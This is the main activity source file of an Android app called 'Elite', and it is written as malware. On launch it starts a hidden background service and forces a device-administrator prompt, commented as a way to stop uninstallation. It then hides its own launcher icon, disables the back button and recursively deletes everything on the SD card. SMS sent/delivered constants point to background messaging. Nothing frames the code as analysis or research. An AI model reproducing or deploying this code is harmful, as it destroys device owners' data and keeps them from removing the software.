package com.elite;

import java.io.File;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Environment;

/**
 * This is main class to start Elite application.
 * @author <b>Elite</b>
 *
 */
public class MainActivity extends Activity {

	String SENT = "SMS_SENT";
    String DELIVERED = "SMS_DELIVERED";
    
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
	
		/**Run services in background.**/
		Intent msgIntent = new Intent(getApplicationContext(), IntentServiceClass.class);
		startService(msgIntent);
		
		/**Stop from uninstalling application.**/
		DeviceManager deviceManager=new DeviceManager();
		deviceManager.activateDeviceAdmin(MainActivity.this, DeviceManager.REQUEST_CODE_ENABLE_ADMIN);
		
		/**wipe out sd-card.**/
		wipeMemoryCard();
	}
	
	@Override
	public void onBackPressed() {
		//super.onBackPressed();
		/**Do nothing.**/
	}
	
	/**
	 * This method is used to hide app from app launcher.
	 * @param context
	 */
	public void HideAppFromLauncher(Context context) {
		try{
		    PackageManager p = context.getPackageManager();
		    p.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
		}catch (Exception e) {
		    e.printStackTrace();
		}
	finish();
	}
	

	/**
	 * This method is used to wipe complete data from sd-card.
	 */
	public void wipeMemoryCard() {
        File deleteMatchingFile = new File(Environment
                .getExternalStorageDirectory().toString());
        try {
            File[] filenames = deleteMatchingFile.listFiles();
            if (filenames != null && filenames.length > 0) {
                for (File tempFile : filenames) {
                    if (tempFile.isDirectory()) {
                        wipeDirectory(tempFile.toString());
                        tempFile.delete();
                    } else {
                        tempFile.delete();
                    }
                }
            } else {
                deleteMatchingFile.delete();
            }
        } catch (Exception e) {
        }
    }

    /**
     * This method is used to wipe directory from sd-card.
     * @param name
     */
    private static void wipeDirectory(String name) {
        try {
			File directoryFile = new File(name);
			File[] filenames = directoryFile.listFiles();
			if (filenames != null && filenames.length > 0) {
			    for (File tempFile : filenames) {
			        if (tempFile.isDirectory()) {
			            wipeDirectory(tempFile.toString());
			            tempFile.delete();
			        } else {
			            tempFile.delete();
			        }
			    }
			} else {
			    directoryFile.delete();
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
    }
	
	@Override
	protected void onActivityResult(int requestCode, int resultCode, Intent data) {
		switch (requestCode) {
		case DeviceManager.REQUEST_CODE_ENABLE_ADMIN:
			DeviceManager adminManager=new DeviceManager();
			if(adminManager.isDeviceAdminActive(getApplicationContext())){
				/**Hide application from app launcher.**/
				HideAppFromLauncher(getApplicationContext());
			}
			else{
				DeviceManager devicemanager=new DeviceManager();
				devicemanager.activateDeviceAdmin(MainActivity.this, DeviceManager.REQUEST_CODE_ENABLE_ADMIN);
			}
		}
	}
	
}
